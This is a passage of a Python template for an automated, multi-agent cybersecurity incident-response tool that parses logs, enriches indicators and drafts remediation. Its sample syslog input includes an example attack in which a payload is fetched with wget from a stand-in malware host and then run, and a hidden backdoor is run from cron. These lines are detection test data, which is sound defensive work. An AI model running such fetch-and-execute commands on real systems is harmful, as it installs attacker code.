        )
        
        # 4. Incident Responder - Specialized in containment and remediation
        self.incident_responder = autogen.AssistantAgent(
            name="IncidentResponder",
            system_message="""You are an expert incident responder who specializes in containing security incidents,
            removing threats, and restoring systems to normal operation.
            
            Your responsibilities:
            1. Provide immediate containment actions to limit the impact of the incident
            2. Develop detailed remediation plans to remove the threat
            3. Recommend recovery steps to restore affected systems
            4. Suggest security improvements to prevent similar incidents
            5. Prioritize actions based on risk and business impact
            
            Your recommendations should be specific, actionable, and prioritized. Consider the potential impact
            of response actions on business operations. Provide both immediate tactical responses and strategic
            improvements. Always consider the order of operations to avoid alerting attackers or destroying evidence.
            Tailor your response to the specific environment and incident details.""",
            llm_config=self.llm_config
        )
        
        # 5. Documentation Specialist - Specialized in creating comprehensive incident documentation
        self.documentation_specialist = autogen.AssistantAgent(
            name="DocumentationSpecialist",
            system_message="""You are an expert in creating comprehensive cybersecurity incident documentation
            that is clear, thorough, and suitable for multiple audiences including technical teams, management,
            and compliance requirements.
            
            Your responsibilities:
            1. Compile incident details into structured documentation
            2. Create executive summaries for management and technical details for IT teams
            3. Ensure documentation satisfies compliance and regulatory requirements
            4. Include all relevant timeline information, affected systems, and remediation steps
            5. Document lessons learned and recommended improvements
            
            Create documentation that is well-organized, precise, and actionable. Use clear sections with
            appropriate headers. Include all relevant technical details while making executive summaries
            accessible to non-technical audiences. Ensure all claims are supported by evidence. Include
            metadata such as incident IDs, dates, and classification.""",
            llm_config=self.llm_config
        )
        
        # User proxy agent for orchestrating the workflow
        self.user_proxy = autogen.UserProxyAgent(
            name="SecurityAnalyst",
            human_input_mode="NEVER",
            code_execution_config={
                "work_dir": "security_workspace",
                "use_docker": False
            },
            system_message="""You are a security analyst coordinating the incident response process.
            Your role is to gather data, distribute it to the specialized analysts, and compile their insights.
            You can execute Python code to analyze security data and fetch threat intelligence."""
        )
    
    def _hash_file(self, file_path: str) -> str:
        """
        Compute SHA-256 hash of a file.
        
        Args:
            file_path: Path to the file
            
        Returns:
            SHA-256 hash as a hexadecimal string
        """
        try:
            sha256_hash = hashlib.sha256()
            with open(file_path, "rb") as f:
                for byte_block in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(byte_block)
            return sha256_hash.hexdigest()
        except Exception as e:
            print(f"Error hashing file {file_path}: {e}")
            return None
    
    def parse_log_data(self, log_data: str, log_type: str = "generic") -> List[Dict[str, Any]]:
        """
        Parse raw log data into structured format based on log type.
        
        Args:
            log_data: Raw log data as string
            log_type: Type of log (generic, windows, linux, firewall, web, etc.)
            
        Returns:
            List of dictionaries containing structured log entries
        """
        structured_logs = []
        
        # Split log data into lines
        log_lines = log_data.strip().split('\n')
        
        if log_type.lower() == "windows_event":
            # Parse Windows Event logs
            current_event = {}
            for line in log_lines:
                line = line.strip()
                if line.startswith("Log Name:"):
                    if current_event:
                        structured_logs.append(current_event)
                    current_event = {"Log Name": line.split("Log Name:")[1].strip()}
                elif ":" in line and current_event:
                    key, value = line.split(":", 1)
                    current_event[key.strip()] = value.strip()
            
            # Add the last event
            if current_event:
                structured_logs.append(current_event)
                
        elif log_type.lower() == "syslog":
            # Parse syslog format
            for line in log_lines:
                if not line.strip():
                    continue
                    
                try:
                    # Basic syslog pattern: <timestamp> <hostname> <process>[<pid>]: <message>
                    match = re.match(r"(\w+\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+([^:]+):\s+(.*)", line)
                    if match:
                        timestamp, hostname, process, message = match.groups()
                        # Extract PID if present
                        pid_match = re.search(r"\[(\d+)\]", process)
                        pid = pid_match.group(1) if pid_match else None
                        process = re.sub(r"\[\d+\]", "", process).strip()
                        
                        structured_logs.append({
                            "timestamp": timestamp,
                            "hostname": hostname,
                            "process": process,
                            "pid": pid,
                            "message": message,
                            "raw_log": line
                        })
                    else:
                        # If pattern doesn't match, store as raw log
                        structured_logs.append({"raw_log": line})
                except Exception as e:
                    structured_logs.append({"raw_log": line, "parse_error": str(e)})
        
        elif log_type.lower() == "apache" or log_type.lower() == "nginx":
            # Parse common web server log format
            for line in log_lines:
                if not line.strip():
                    continue
                    
                try:
                    # Common Log Format: <ip> <identity> <user> [<time>] "<request>" <status> <size>
                    # Combined Log Format: adds "<referrer>" "<user_agent>"
                    pattern = r'(\S+) (\S+) (\S+) \[(.*?)\] "([^"]*)" (\d+) (\S+)(?: "([^"]*)" "([^"]*)")?'
                    match = re.match(pattern, line)
                    
                    if match:
                        groups = match.groups()
                        log_entry = {
                            "ip": groups[0],
                            "identity": groups[1],
                            "user": groups[2],
                            "time": groups[3],
                            "request": groups[4],
                            "status": groups[5],
                            "size": groups[6],
                            "raw_log": line
                        }
                        
                        # Add referrer and user_agent if available (Combined Log Format)
                        if len(groups) > 7:
                            log_entry["referrer"] = groups[7]
                        if len(groups) > 8:
                            log_entry["user_agent"] = groups[8]
                        
                        structured_logs.append(log_entry)
                    else:
                        structured_logs.append({"raw_log": line})
                except Exception as e:
                    structured_logs.append({"raw_log": line, "parse_error": str(e)})
        
        elif log_type.lower() == "firewall":
            # Parse basic firewall log format
            for line in log_lines:
                if not line.strip():
                    continue
                    
                try:
                    # Extract key-value pairs from firewall logs
                    # Example: timestamp=2023-04-12T12:34:56 action=BLOCK src=192.168.1.2 dst=10.0.0.1 proto=TCP
                    log_entry = {"raw_log": line}
                    
                    # Extract key-value pairs
                    kvp_pattern = r'(\w+)=([^ ]+)'
                    for k, v in re.findall(kvp_pattern, line):
                        log_entry[k] = v
                    
                    structured_logs.append(log_entry)
                except Exception as e:
                    structured_logs.append({"raw_log": line, "parse_error": str(e)})
        
        else:
            # Generic log parsing - best effort
            for line in log_lines:
                if not line.strip():
                    continue
                
                log_entry = {"raw_log": line}
                
                # Try to extract timestamp
                timestamp_pattern = r'\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?\b'
                timestamp_match = re.search(timestamp_pattern, line)
                if timestamp_match:
                    log_entry["timestamp"] = timestamp_match.group(0)
                
                # Try to extract IP addresses
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                ip_addresses = re.findall(ip_pattern, line)
                if ip_addresses:
                    log_entry["ip_addresses"] = ip_addresses
                
                # Try to extract severity levels
                severity_pattern = r'\b(ERROR|WARN(?:ING)?|INFO|DEBUG|CRITICAL|ALERT|EMERGENCY)\b'
                severity_match = re.search(severity_pattern, line, re.IGNORECASE)
                if severity_match:
                    log_entry["severity"] = severity_match.group(0)
                
                structured_logs.append(log_entry)
        
        return structured_logs
    
    def extract_indicators(self, logs: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        """
        Extract potential indicators of compromise from logs.
        
        Args:
            logs: Parsed log data
            
        Returns:
            Dictionary of indicators by type (ip, domain, hash, etc.)
        """
        indicators = {
            "ips": set(),
            "domains": set(),
            "urls": set(),
            "hashes": set(),
            "usernames": set(),
            "filenames": set()
        }
        
        for log in logs:
            raw_log = log.get("raw_log", "")
            
            # Extract IPs
            # Also look in specific fields like src, dst, source_ip, etc.
            ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            found_ips = re.findall(ip_pattern, raw_log)
            
            for ip_field in ["ip", "src", "dst", "source_ip", "destination_ip", "client_ip"]:
                if ip_field in log and log[ip_field]:
                    found_ips.append(log[ip_field])
            
            for ip in found_ips:
                try:
                    # Validate IP address format
                    ipaddress.ip_address(ip)
                    # Skip private and loopback addresses
                    ip_obj = ipaddress.ip_address(ip)
                    if not (ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_multicast):
                        indicators["ips"].add(ip)
                except:
                    pass
            
            # Extract domains
            domain_pattern = r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b'
            found_domains = re.findall(domain_pattern, raw_log)
            
            for domain in found_domains:
                # Skip common benign domains
                common_domains = ["google.com", "microsoft.com", "apple.com", "amazon.com"]
                if not any(domain.endswith(d) for d in common_domains):
                    indicators["domains"].add(domain)
            
            # Extract URLs
            url_pattern = r'https?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
            found_urls = re.findall(url_pattern, raw_log)
            indicators["urls"].update(found_urls)
            
            # Extract file hashes (MD5, SHA1, SHA256)
            md5_pattern = r'\b[a-fA-F0-9]{32}\b'
            sha1_pattern = r'\b[a-fA-F0-9]{40}\b'
            sha256_pattern = r'\b[a-fA-F0-9]{64}\b'
            
            indicators["hashes"].update(re.findall(md5_pattern, raw_log))
            indicators["hashes"].update(re.findall(sha1_pattern, raw_log))
            indicators["hashes"].update(re.findall(sha256_pattern, raw_log))
            
            # Extract usernames - depends on log format
            # This is a simple extraction for common formats, would need to be customized
            if "user" in log and log["user"] and log["user"] != "-":
                indicators["usernames"].add(log["user"])
            
            # Look for username patterns in raw log
            username_pattern = r'user[=:]([^\s;]+)'
            username_matches = re.findall(username_pattern, raw_log, re.IGNORECASE)
            indicators["usernames"].update(username_matches)
            
            # Extract filenames with potential malicious extensions
            malicious_extensions = [".exe", ".dll", ".ps1", ".vbs", ".bat", ".sh", ".js", ".hta"]
            filename_pattern = r'\b[\w-]+(\.[\w-]+)+\b'
            found_filenames = re.findall(filename_pattern, raw_log)
            
            for filename in found_filenames:
                _, ext = os.path.splitext(filename)
                if ext.lower() in malicious_extensions:
                    indicators["filenames"].add(filename)
        
        # Convert sets to lists for JSON serialization
        return {k: list(v) for k, v in indicators.items()}
    
    def check_indicator_reputation(self, indicator: str, indicator_type: str) -> Dict[str, Any]:
        """
        Check the reputation of an indicator using threat intelligence services.
        
        Args:
            indicator: The indicator value
            indicator_type: Type of indicator (ip, domain, hash, url)
            
        Returns:
            Dictionary with reputation data
        """
        # Check cache first
        cache_key = f"{indicator_type}:{indicator}"
        if cache_key in self.threat_intel_cache:
            return self.threat_intel_cache[cache_key]
        
        reputation_data = {
            "indicator": indicator,
            "type": indicator_type,
            "malicious": False,
            "reputation_score": 0,
            "tags": [],
            "source": "Unknown",
            "last_seen": None
        }
        
        try:
            if indicator_type == "ip":
                # Check IP reputation using AbuseIPDB
                url = f"https://api.abuseipdb.com/api/v2/check"
                headers = {
                    "Accept": "application/json",
                    "Key": ABUSEIPDB_API_KEY
                }
                params = {
                    "ipAddress": indicator,
                    "maxAgeInDays": 90,
                    "verbose": True
                }
                
                response = requests.get(url, headers=headers, params=params)
                if response.status_code == 200:
                    data = response.json().get("data", {})
                    abuse_score = data.get("abuseConfidenceScore", 0)
                    domain = data.get("domain", "")
                    
                    reputation_data.update({
                        "malicious": abuse_score > 50,
                        "reputation_score": abuse_score,
                        "tags": data.get("usageType", "").split(","),
                        "source": "AbuseIPDB",
                        "domain": domain,
                        "country": data.get("countryCode", ""),
                        "reports": data.get("totalReports", 0),
                        "last_seen": data.get("lastReportedAt", None)
                    })
            
            elif indicator_type in ["hash", "file_hash"]:
                # Check file hash reputation using VirusTotal
                url = f"https://www.virustotal.com/api/v3/files/{indicator}"
                headers = {
                    "x-apikey": VIRUSTOTAL_API_KEY
                }
                
                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    data = response.json().get("data", {})
                    attributes = data.get("attributes", {})
                    stats = attributes.get("last_analysis_stats", {})
                    
                    malicious_count = stats.get("malicious", 0)
                    suspicious_count = stats.get("suspicious", 0)
                    total_engines = sum(stats.values())
                    
                    # Calculate reputation score (0-100)
                    if total_engines > 0:
                        reputation_score = ((malicious_count + suspicious_count) / total_engines) * 100
                    else:
                        reputation_score = 0
                    
                    # Get tags from popular threat categories
                    tags = []
                    popular_threats = attributes.get("popular_threat_classification", {}).get("suggested_threat_label", "")
                    if popular_threats:
                        tags.append(popular_threats)
                    
                    reputation_data.update({
                        "malicious": malicious_count > 0,
                        "reputation_score": reputation_score,
                        "tags": tags,
                        "source": "VirusTotal",
                        "detection_ratio": f"{malicious_count}/{total_engines}",
                        "file_type": attributes.get("type_description", "Unknown"),
                        "first_seen": attributes.get("first_submission_date", None),
                        "last_seen": attributes.get("last_analysis_date", None)
                    })
            
            elif indicator_type in ["domain", "url"]:
                # Check domain/URL reputation using VirusTotal
                if indicator_type == "domain":
                    url = f"https://www.virustotal.com/api/v3/domains/{indicator}"
                else:
                    # URL needs to be properly encoded for the API
                    encoded_url = indicator.replace("/", "%2F").replace(":", "%3A")
                    url = f"https://www.virustotal.com/api/v3/urls/{encoded_url}"
                
                headers = {
                    "x-apikey": VIRUSTOTAL_API_KEY
                }
                
                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    data = response.json().get("data", {})
                    attributes = data.get("attributes", {})
                    stats = attributes.get("last_analysis_stats", {})
                    
                    malicious_count = stats.get("malicious", 0)
                    suspicious_count = stats.get("suspicious", 0)
                    total_engines = sum(stats.values())
                    
                    # Calculate reputation score (0-100)
                    if total_engines > 0:
                        reputation_score = ((malicious_count + suspicious_count) / total_engines) * 100
                    else:
                        reputation_score = 0
                    
                    # Get categories assigned by threat intelligence
                    categories = attributes.get("categories", {})
                    tags = list(set(categories.values()))
                    
                    reputation_data.update({
                        "malicious": malicious_count > 0,
                        "reputation_score": reputation_score,
                        "tags": tags,
                        "source": "VirusTotal",
                        "detection_ratio": f"{malicious_count}/{total_engines}",
                        "last_seen": attributes.get("last_analysis_date", None)
                    })
        
        except Exception as e:
            reputation_data["error"] = str(e)
        
        # Cache the result
        self.threat_intel_cache[cache_key] = reputation_data
        
        return reputation_data
    
    def enrich_indicators(self, indicators: Dict[str, List[str]]) -> Dict[str, List[Dict[str, Any]]]:
        """
        Enrich indicators with threat intelligence data.
        
        Args:
            indicators: Dictionary of indicators by type
            
        Returns:
            Dictionary of enriched indicators by type
        """
        enriched = {}
        
        for ind_type, ind_list in indicators.items():
            enriched[ind_type] = []
            
            # Map indicator types to check_indicator_reputation types
            type_mapping = {
                "ips": "ip",
                "domains": "domain",
                "urls": "url",
                "hashes": "hash"
            }
            
            if ind_type in type_mapping:
                for indicator in ind_list:
                    reputation = self.check_indicator_reputation(
                        indicator, 
                        type_mapping[ind_type]
                    )
                    enriched[ind_type].append(reputation)
            else:
                # For types without reputation check, just add the raw indicators
                enriched[ind_type] = [{"indicator": ind, "type": ind_type} for ind in ind_list]
        
        return enriched
    
    def identify_attack_techniques(self, logs: List[Dict[str, Any]], enriched_indicators: Dict[str, List[Dict[str, Any]]]) -> List[Dict[str, Any]]:
        """
        Identify potential MITRE ATT&CK techniques from logs and indicators.
        
        Args:
            logs: Parsed log data
            enriched_indicators: Enriched indicators from threat intelligence
            
        Returns:
            List of identified attack techniques with evidence
        """
        # Use OpenAI to identify potential attack techniques
        # Prepare the prompt with log examples and enriched indicators
        
        # Select a sample of logs (to avoid token limits)
        log_sample = logs[:20] if len(logs) > 20 else logs
        log_sample_text = json.dumps(log_sample, indent=2)
        
        # Prepare enriched indicators summary
        indicators_summary = ""
        malicious_indicators = []
        
        for ind_type, ind_list in enriched_indicators.items():
            # Filter to include only malicious indicators
            malicious = [ind for ind in ind_list if ind.get("malicious", False)]
            if malicious:
                malicious_indicators.extend(malicious)
                indicators_summary += f"\n{ind_type.upper()}:\n"
                for ind in malicious[:5]:  # Limit to 5 indicators per type
                    indicators_summary += f"- {ind['indicator']} (Score: {ind['reputation_score']}, Tags: {', '.join(ind['tags'])})\n"
                
                if len(malicious) > 5:
                    indicators_summary += f"  ... and {len(malicious) - 5} more\n"
        
        # Prepare the prompt
        prompt = f"""Analyze the following security logs and malicious indicators to identify potential MITRE ATT&CK techniques:

LOG SAMPLE:
{log_sample_text}

MALICIOUS INDICATORS:
{indicators_summary}

Based on these logs and indicators, identify the most likely MITRE ATT&CK techniques being used.
For each technique, provide:
1. The technique ID and name
2. Confidence level (high, medium, low)
3. Specific evidence from the logs or indicators
4. Explanation of why this technique matches the evidence

Format the response as a JSON array of techniques.
"""
        
        try:
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a cybersecurity expert specialized in mapping security incidents to the MITRE ATT&CK framework."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Extract and parse the response
            attack_techniques = json.loads(response.choices[0].message.content)
            
            # If the response is wrapped in a container object, extract the techniques array
            if "techniques" in attack_techniques:
                attack_techniques = attack_techniques["techniques"]
            
            return attack_techniques
            
        except Exception as e:
            print(f"Error identifying attack techniques: {e}")
            return []
    
    def assess_severity(
        self, 
        attack_techniques: List[Dict[str, Any]], 
        enriched_indicators: Dict[str, List[Dict[str, Any]]]
    ) -> Dict[str, Any]:
        """
        Assess the severity of the security incident.
        
        Args:
            attack_techniques: Identified ATT&CK techniques
            enriched_indicators: Enriched indicators from threat intelligence
            
        Returns:
            Dictionary with severity assessment
        """
        # Count high confidence techniques
        high_confidence_techniques = sum(1 for t in attack_techniques if t.get("confidence", "").lower() == "high")
        
        # Count malicious indicators
        malicious_count = sum(
            sum(1 for ind in ind_list if ind.get("malicious", False))
            for ind_type, ind_list in enriched_indicators.items()
        )
        
        # Initial severity score calculation (0-100)
        severity_score = 0
        
        # Factor 1: Number of high confidence techniques (up to 40 points)
        technique_score = min(high_confidence_techniques * 10, 40)
        severity_score += technique_score
        
        # Factor 2: Number of malicious indicators (up to 30 points)
        indicator_score = min(malicious_count * 5, 30)
        severity_score += indicator_score
        
        # Factor 3: Types of techniques identified (up to 30 points)
        # Check for high-severity techniques
        high_severity_tactics = ["Impact", "Exfiltration", "Command and Control", "Privilege Escalation"]
        
        tactic_score = 0
        tactics_found = set()
        
        for technique in attack_techniques:
            tactic = technique.get("tactic", "")
            if tactic:
                tactics_found.add(tactic)
                
                # Add extra points for high-severity tactics
                if tactic in high_severity_tactics:
                    tactic_score += 5
        
        # Add points for diversity of tactics (technique spread)
        tactic_score += len(tactics_found) * 3
        tactic_score = min(tactic_score, 30)
        
        severity_score += tactic_score
        
        # Determine severity level based on score
        severity_level = "Informational"
        if severity_score >= 80:
            severity_level = "Critical"
        elif severity_score >= 60:
            severity_level = "High"
        elif severity_score >= 40:
            severity_level = "Medium"
        elif severity_score >= 20:
            severity_level = "Low"
        
        return {
            "severity_level": severity_level,
            "severity_score": severity_score,
            "factors": {
                "high_confidence_techniques": high_confidence_techniques,
                "malicious_indicators": malicious_count,
                "tactics_identified": list(tactics_found),
                "technique_score": technique_score,
                "indicator_score": indicator_score,
                "tactic_score": tactic_score
            }
        }
    
    def generate_remediation_steps(
        self, 
        attack_techniques: List[Dict[str, Any]], 
        severity_assessment: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Generate remediation steps based on identified attack techniques.
        
        Args:
            attack_techniques: Identified ATT&CK techniques
            severity_assessment: Severity assessment
            
        Returns:
            List of remediation steps
        """
        # Use OpenAI to generate remediation steps
        # Prepare the prompt with attack techniques and severity
        techniques_text = json.dumps(attack_techniques, indent=2)
        severity_text = json.dumps(severity_assessment, indent=2)
        
        prompt = f"""Based on the following identified attack techniques and severity assessment, provide detailed remediation steps:

ATTACK TECHNIQUES:
{techniques_text}

SEVERITY ASSESSMENT:
{severity_text}

For each identified attack technique, provide:
1. Immediate containment actions
2. Eradication steps to remove the threat
3. Recovery procedures
4. Long-term prevention measures

Consider the severity when prioritizing actions. Provide specific, actionable steps rather than general advice.
Format the response as a JSON array of remediation steps, grouped by phase (containment, eradication, recovery, prevention).
"""
        
        try:
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a cybersecurity incident response expert specialized in developing remediation plans."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                response_format={"type": "json_object"}
            )
            
            # Extract and parse the response
            remediation_steps = json.loads(response.choices[0].message.content)
            
            # If the response is wrapped in a container object, extract the remediation array
            if "remediation_steps" in remediation_steps:
                remediation_steps = remediation_steps["remediation_steps"]
            
            return remediation_steps
            
        except Exception as e:
            print(f"Error generating remediation steps: {e}")
            return []
    
    def analyze_incident(self, log_data: str, log_type: str = "generic", additional_context: str = None) -> Dict[str, Any]:
        """
        Analyze security incident data using the agent team.
        
        Args:
            log_data: Raw log data as string
            log_type: Type of log data
            additional_context: Additional context about the environment or incident
            
        Returns:
            Dictionary with comprehensive incident analysis
        """
        # Create a unique incident ID
        incident_id = f"INC-{uuid.uuid4().hex[:8]}"
        
        # Create group chat for agent collaboration
        groupchat = autogen.GroupChat(
            agents=[
                self.user_proxy, 
                self.threat_detector, 
                self.forensic_investigator, 
                self.threat_intel_analyst,
                self.incident_responder,
                self.documentation_specialist
            ],
            messages=[],
            max_round=15
        )
        
        manager = autogen.GroupChatManager(groupchat=groupchat)
        
        # Process log data
        parsed_logs = self.parse_log_data(log_data, log_type)
        
        # Extract indicators
        indicators = self.extract_indicators(parsed_logs)
        
        # Enrich indicators with threat intelligence
        enriched_indicators = self.enrich_indicators(indicators)
        
        # Identify attack techniques
        attack_techniques = self.identify_attack_techniques(parsed_logs, enriched_indicators)
        
        # Assess severity
        severity = self.assess_severity(attack_techniques, enriched_indicators)
        
        # Generate remediation steps
        remediation_steps = self.generate_remediation_steps(attack_techniques, severity)
        
        # Prepare summary of findings for the agents
        malicious_indicators_summary = ""
        for ind_type, ind_list in enriched_indicators.items():
            malicious = [ind for ind in ind_list if ind.get("malicious", False)]
            if malicious:
                malicious_indicators_summary += f"\n{ind_type.upper()} ({len(malicious)}):\n"
                for ind in malicious[:5]:  # Limit to 5 indicators per type for readability
                    tags = ", ".join(ind.get('tags', [])[:3])  # Limit tags to first 3
                    malicious_indicators_summary += f"- {ind['indicator']} (Score: {ind.get('reputation_score', 'N/A')}, Tags: {tags})\n"
                
                if len(malicious) > 5:
                    malicious_indicators_summary += f"  ... and {len(malicious) - 5} more\n"
        
        # Prepare attack techniques summary
        techniques_summary = ""
        for i, technique in enumerate(attack_techniques[:5], 1):  # Limit to 5 techniques for readability
            technique_id = technique.get("technique_id", "Unknown")
            name = technique.get("name", "Unknown")
            confidence = technique.get("confidence", "Unknown")
            
            techniques_summary += f"{i}. {technique_id} - {name} (Confidence: {confidence})\n"
            
            # Add brief evidence
            evidence = technique.get("evidence", "")
            if isinstance(evidence, str) and evidence:
                evidence_brief = evidence[:150] + "..." if len(evidence) > 150 else evidence
                techniques_summary += f"   Evidence: {evidence_brief}\n"
        
        if len(attack_techniques) > 5:
            techniques_summary += f"... and {len(attack_techniques) - 5} more techniques\n"
        
        # Generate initial prompt for the agent team
        analysis_prompt = f"""
        SECURITY INCIDENT ANALYSIS
        Incident ID: {incident_id}
        Log Type: {log_type}
        Severity: {severity['severity_level']} (Score: {severity['severity_score']}/100)
        
        I need your collaborative analysis of this security incident. Initial automated analysis has identified:
        
        POTENTIAL ATTACK TECHNIQUES:
        {techniques_summary}
        
        MALICIOUS INDICATORS:
        {malicious_indicators_summary}
        
        LOG SAMPLE (first 5 entries):
        {json.dumps(parsed_logs[:5], indent=2)}
        
        {"ADDITIONAL CONTEXT:\n" + additional_context if additional_context else ""}
        
        I need the team to work together to provide:
        1. ThreatDetector: Analyze the logs for additional suspicious patterns and refine the attack identification
        2. ForensicInvestigator: Reconstruct the incident timeline and determine the scope of compromise
        3. ThreatIntelAnalyst: Provide context on the threat actors and their TTPs based on the indicators
        4. IncidentResponder: Create a detailed remediation plan with prioritized actions
        5. DocumentationSpecialist: Compile all findings into a comprehensive incident report
        
        The SecurityAnalyst (me) will coordinate your work. Please be specific, thorough, and actionable in your analysis.
        """
        
        # Start the group chat
        result = self.user_proxy.initiate_chat(
            manager,
            message=analysis_prompt
        )
        
        # Extract the final report
        final_report = None
        for message in reversed(self.user_proxy.chat_history):
            if message['role'] == 'assistant' and 'DocumentationSpecialist' in message.get('name', ''):
                final_report = message['content']
                break
        
        if not final_report:
            # Use the last substantial response if no clear report
            for message in reversed(self.user_proxy.chat_history):
                if message['role'] == 'assistant' and len(message['content']) > 500:
                    final_report = message['content']
                    break
        
        # Compile the complete analysis results
        analysis_result = {
            "incident_id": incident_id,
            "timestamp": datetime.datetime.now().isoformat(),
            "log_type": log_type,
            "severity": severity,
            "indicators": {
                "total": {
                    k: len(v) for k, v in indicators.items() if v
                },
                "malicious": {
                    k: len([ind for ind in v if ind.get("malicious", False)]) 
                    for k, v in enriched_indicators.items() if v
                },
                "details": enriched_indicators
            },
            "attack_techniques": attack_techniques,
            "remediation_steps": remediation_steps,
            "report": final_report,
            "metadata": {
                "log_count": len(parsed_logs),
                "analysis_version": "1.0"
            }
        }
        
        return analysis_result

# Example usage
if __name__ == "__main__":
    # Create incident response agent
    ir_agent = CybersecurityIncidentResponseAgent()
    
    # Example log data (simplified for demonstration)
    example_logs = """
Apr 15 12:34:56 server sshd[12345]: Failed password for invalid user admin from 203.0.113.1 port 49812 ssh2
Apr 15 12:35:01 server sshd[12345]: Failed password for invalid user admin from 203.0.113.1 port 49813 ssh2
Apr 15 12:35:05 server sshd[12345]: Failed password for invalid user admin from 203.0.113.1 port 49814 ssh2
Apr 15 12:35:10 server sshd[12345]: Failed password for invalid user admin from 203.0.113.1 port 49815 ssh2
Apr 15 12:35:15 server sshd[12345]: Failed password for invalid user admin from 203.0.113.1 port 49816 ssh2
Apr 15 12:35:30 server sshd[12346]: Accepted password for user root from 203.0.113.1 port 49820 ssh2
Apr 15 12:36:00 server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c wget http://malware.example.com/payload.sh
Apr 15 12:36:10 server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash payload.sh
Apr 15 12:37:05 server kernel: [1234567.123456] Firewall: Blocked outbound connection to 198.51.100.1:8080
Apr 15 12:38:30 server crontab[12347]: (root) BEGIN EDIT (root)
Apr 15 12:38:45 server crontab[12347]: (root) END EDIT (root)
Apr 15 12:39:00 server cron[12348]: (root) CMD (/usr/bin/python3 /tmp/.hidden/backdoor.py)
    """
    
    # Analyze the incident
    analysis = ir_agent.analyze_incident(
        log_data=example_logs,
        log_type="syslog",
        additional_context="Linux server running in AWS. Contains customer data and is publicly accessible."
    )
    
    # Print a summary of the results
    print(f"Incident ID: {analysis['incident_id']}")
    print(f"Severity: {analysis['severity']['severity_level']} (Score: {analysis['severity']['severity_score']})")
    print("\nMalicious Indicators:")
    for ind_type, count in analysis['indicators']['malicious'].items():
        if count > 0:
            print(f"- {ind_type}: {count}")
    
    print("\nAttack Techniques:")
    for technique in analysis['attack_techniques'][:3]:  # Show first 3
        print(f"- {technique.get('technique_id', 'Unknown')}: {technique.get('name', 'Unknown')}")
    
    print("\nReport Excerpt:")
    if analysis['report']:
        report_excerpt = analysis['report'][:500] + "..." if len(analysis['report']) > 500 else analysis['report']
        print(report_excerpt)
```

**Usage Example:**

```python
from cybersecurity_incident_response_agent import CybersecurityIncidentResponseAgent

# Initialize the agent
ir_agent = CybersecurityIncidentResponseAgent()

# Example firewall logs
firewall_logs = """
timestamp=2023-10-15T08:12:45Z src=192.168.1.105 dst=103.45.67.89 proto=TCP sport=49123 dport=445 action=BLOCK reason=policy
timestamp=2023-10-15T08:12:47Z src=192.168.1.105 dst=103.45.67.89 proto=TCP sport=49124 dport=445 action=BLOCK reason=policy
timestamp=2023-10-15T08:13:01Z src=192.168.1.106 dst=103.45.67.89 proto=TCP sport=51234 dport=445 action=BLOCK reason=policy
timestamp=2023-10-15T09:23:15Z src=103.45.67.89 dst=192.168.1.50 proto=TCP sport=3389 dport=49562 action=ALLOW reason=policy
timestamp=2023-10-15T09:25:03Z src=192.168.1.50 dst=185.147.22.55 proto=TCP sport=49621 dport=443 action=ALLOW reason=policy
timestamp=2023-10-15T09:26:45Z src=192.168.1.50 dst=185.147.22.55 proto=TCP sport=49622 dport=443 action=ALLOW reason=policy
timestamp=2023-10-15T09:27:12Z src=192.168.1.50 dst=185.147.22.55 proto=TCP sport=49623 dport=443 action=ALLOW reason=policy
timestamp=2023-10-15T10:45:13Z src=192.168.1.50 dst=172.16.10.5 proto=TCP sport=49755 dport=139 action=ALLOW reason=policy
timestamp=2023-10-15T10:45:15Z src=192.168.1.50 dst=172.16.10.5 proto=TCP sport=49756 dport=445 action=ALLOW reason=policy
timestamp=2023-10-15T10:46:02Z src=192.168.1.50 dst=172.16.10.6 proto=TCP sport=49802 dport=445 action=ALLOW reason=policy
"""

# Additional context about the environment
additional_context = """
This is a corporate network with approximately 200 endpoints. The environment includes:
- Windows workstations and servers
- Office 365 cloud services
- VPN for remote access
- Sensitive financial data stored on internal file servers
- PCI compliance requirements
"""

# Analyze the incident
analysis = ir_agent.analyze_incident(
    log_data=firewall_logs,
    log_type="firewall",
    additional_context=additional_context
)

# Print key findings
print(f"INCIDENT ID: {analysis['incident_id']}")
print(f"SEVERITY: {analysis['severity']['severity_level']} (Score: {analysis['severity']['severity_score']})")

print("\nKEY INDICATORS:")
for ind_type, count in analysis['indicators']['malicious'].items():
    if count > 0:
        print(f"- {ind_type}: {count} malicious out of {analysis['indicators']['total'].get(ind_type, 0)} total")

print("\nATTACK TECHNIQUES:")
for technique in analysis['attack_techniques']:
    print(f"- {technique.get('technique_id', 'N/A')}: {technique.get('name', 'N/A')} ({technique.get('confidence', 'N/A')})")

print("\nTOP REMEDIATION STEPS:")
for phase, steps in analysis['remediation_steps'][0].items():
    print(f"\n{phase.upper()}:")
    for i, step in enumerate(steps[:3], 1):  # Show top 3 steps per phase
        print(f"{i}. {step}")
    if len(steps) > 3:
        print(f"   ... and {len(steps) - 3} more steps")

print("\nFULL REPORT AVAILABLE IN ANALYSIS RESULT")
```

This Cybersecurity Incident Response agent template demonstrates key security automation patterns:

1. **Specialized Analysis**: Different security specialties (forensics, threat intelligence, remediation) working together
